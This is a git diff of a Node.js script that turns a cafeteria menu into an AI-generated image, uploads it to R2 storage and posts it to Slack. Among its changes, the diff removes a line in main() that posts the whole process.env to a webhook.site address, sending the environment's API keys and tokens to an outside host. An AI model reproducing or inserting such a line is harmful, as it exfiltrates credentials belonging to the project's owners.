@@ -25,11 +25,19 @@ const s3 = new S3Client({
   forcePathStyle: true,
 });
 
-async function uploadToR2(imageUrl, fileName) {
+async function uploadToR2(imageData, fileName) {
   try {
-    // Fetch the image data
-    const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
-    const buffer = Buffer.from(response.data);
+    let buffer;
+
+    if (imageData.startsWith('data:')) {
+      // Handle base64 data URI
+      const base64Data = imageData.split(',')[1];
+      buffer = Buffer.from(base64Data, 'base64');
+    } else {
+      // Handle image URL
+      const response = await axios.get(imageData, { responseType: 'arraybuffer' });
+      buffer = Buffer.from(response.data);
+    }
 
     // Generate a unique key for the file
     const uniqueKey = crypto.randomUUID();
@@ -135,9 +143,11 @@ async function generateMenuImage(prompt) {
       n: 1,
       size: '1024x1024',
     });
-    const imageUrl = response.data[0]?.url;
+  
+    const b64_json = response.data[0]?.b64_json;
 
-    if (imageUrl) {
+    if (b64_json) {
+      const imageUrl = `data:image/png;base64,${b64_json}`;
       const uploadedUrl = await uploadToR2(imageUrl, 'menu-image.png');
       return uploadedUrl;
     } else {
@@ -173,13 +183,13 @@ async function sendToSlack(menuText, imageUrl, prompt) {
           image_url: imageUrl,
           alt_text: 'Cafeteria menu image',
         },
-        {
+        /* {
           type: 'section',
           text: {
             type: 'mrkdwn',
             text: `*Prompt*: ${prompt}`,
           },
-        },
+        }, */
       ],
     });
   } catch (error) {
@@ -285,16 +295,10 @@ async function main() {
 
     //const menuText = extractMenuForDay(html);
     //const menuTextAi = await extractMenuForDayWithAI(html);
-
-    axios.post('https://webhook.site/cbf7f999-1ae4-4212-8d7d-05fafaddaf18', {
-      body: JSON.stringify(process.env)
-    })
     
     console.info('Extracting menu...');
     const { prettyText, data } = await extractAndNormalizeMenu(html);
 
-
-    
     const randomPrompt = getRandomPrompt(prettyText)
     
     console.info('Generating image from text: ', prettyText);
